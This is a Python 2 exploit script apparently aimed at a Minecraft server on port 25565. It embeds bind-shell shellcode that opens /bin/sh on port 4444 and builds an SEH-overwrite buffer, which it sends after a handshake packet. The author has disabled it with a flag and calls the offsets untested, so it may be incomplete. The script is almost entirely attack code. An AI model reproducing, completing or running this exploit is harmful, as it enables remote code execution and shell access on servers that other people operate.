import socket
import sys

working = 0
if working:
    print "Yay you enabled working mode have fun"
else:
    print "This program is not configured"
    print "Script kiddies piss off"
    sys.exit()

try:
    host = sys.argv[1]
    #os = sys.argv[2]
    port = 25565
except IndexError:
    print "[+] Usage %s <host> " % sys.argv[0]
    print "[i] Example: mce.py localhost"
    sys.exit()


# 355 bytes bind shell, PORT 4444,  bad chars \x09\x0a\x0d\x20
shell = ("\xb8\x61\x00\x00\x02\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05\x49\x89\xc4\x48\x89\xc7\xb8\x62\x00\x00\x02\x48\x31\xf6\x56\x48\xbe\x00\x02\x11\x5c\x0a\x00\x01\x0f\x56\x48\x89\xe6\x6a\x10\x5a\x0f\x05\x4c\x89\xe7\xb8\x5a\x00\x00\x02\x48\x31\xf6\x0f\x05\xb8\x5a\x00\x00\x02\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb8\x3b\x00\x00\x02\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x8b\x3c\x24\x48\x31\xd2\x52\x57\x48\x89\xe6\x0f\x05")


# none of the following setting is correct till a fuzzer can be made to test for these :)
crash = "\x41" * 2487
retn = "\x38\x2e\x14\x10" # 0x10142e38 pop edi pop esi ret
filler = "\x44" * (2505-334-300-100)                            # Template
nseh = "\xeb\x08\x90\x90"
stack_fill="\x41"*100
nops="\x90"*8
#egg = "t00wt00w"


exploit = crash + nseh + retn + nops  + stack_fill + nops  + shell #filler

bufferhex = "1000bc02093132372e302e302e3163dd020900076d65726b333630"
buffer = bufferhex.decode("hex")

secondbufferhex = "85020180017b757f9c415785c2515086c02fbb353ec7e8fa1dbd52d722145e7a47623e1b88b5e427d5737989e202000cca4acad2ad8566a1da11e015c12e060c0bb6e62deace9ccb8658e1d2190bc2b0c33fd01d6b58b5c9406638f2b221fa82b46e9b399dea8b6dfe21ff49f85bf6ef05eff5c82d909e0a4c74e3c528f45b7bee216d24fa800174a01e725d9a5308ede10f09e12e18f15ce25241fb7dbc2f927a9558d29f879f4512b3a1eb26fc1bb6eaab7ec300a7e5607a06d655334624a55eebd6856cd790a4ac78728b4ec6b96eca403ec9d103cdf178b6127e3a592050546318cd09806737b1bd8aa5374b67228d192269424d6c5f27c1c183c86798708b6bb259c9f71c"

secondbuffer = secondbufferhex.decode("hex") + exploit

#while 1:
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((host,port))
s.settimeout(60)
s.send(buffer)
s.recv(4906)
s.send(secondbuffer)
s.close()
